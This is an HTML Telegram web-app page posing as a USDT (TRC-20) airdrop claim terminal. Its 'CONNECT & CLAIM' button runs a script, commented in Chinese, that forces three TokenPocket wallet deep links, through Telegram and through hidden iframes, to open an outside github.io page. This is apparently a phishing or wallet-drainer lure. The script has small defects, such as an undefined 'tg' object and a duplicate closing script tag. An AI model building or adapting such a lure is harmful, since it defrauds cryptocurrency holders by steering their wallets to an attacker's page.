<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AIRDROP TERMINAL</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        #terminal {
            width: 90%;
            border: 2px solid #ff0000;
            padding: 20px;
            box-shadow: 0 0 15px #ff0000;
            background: rgba(20, 0, 0, 0.8);
            font-size: 14px;
            line-height: 1.5;
        }
        .btn {
            background: #ff0000;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
            text-transform: uppercase;
            box-shadow: 0 0 10px #ff0000;
            text-decoration: none;
            display: inline-block;
        }
        .glitch {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div id="terminal">
        <h2>> SYSTEM: AIRDROP_DETECTED</h2>
        <p>> STATUS: READY_TO_CLAIM</p>
        <p>> TOKEN: USDT (TRC-20)</p>
        <p id="log">> CONNECTION: AWAITING_USER_INPUT...</p>
    </div>

   <a href="javascript:void(0)" class="btn glitch" onclick="bombard()">
    CONNECT & CLAIM
</a>

<script>
    function bombard() {
        tg.HapticFeedback.notificationOccurred('success');
        const log = document.getElementById('log');
        const myUrl = "https://patrickdafhao-code.github.io/cook/";
        
        // 构造三种不同的可能协议
        const links = [
            // 1. 国内版标准协议
            "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": myUrl})),
            // 2. 海外版/老版常用协议
            "tpoutside://pull.activity?url=" + encodeURIComponent(myUrl),
            // 3. 通用 DApp 协议 (部分版本 TP 支持)
            "dapp://" + myUrl.replace("https://", "")
        ];

        log.innerHTML = "<p style='color:#0f0'>> [ATTEMPT]: SENDING_MULTI_PROTOCOL...</p>";

        // 循环尝试所有链接
        links.forEach((link, i) => {
            setTimeout(() => {
                // 尝试用 Telegram API 打开 (会触发弹窗)
                tg.openLink(link, { try_browser: true });
                
                // 同时也尝试用底层 location 跳转
                const checker = document.createElement('iframe');
                checker.style.display = 'none';
                checker.src = link;
                document.body.appendChild(checker);
            }, i * 300);
        });
    }
</script>
</script>
</body>
</html>
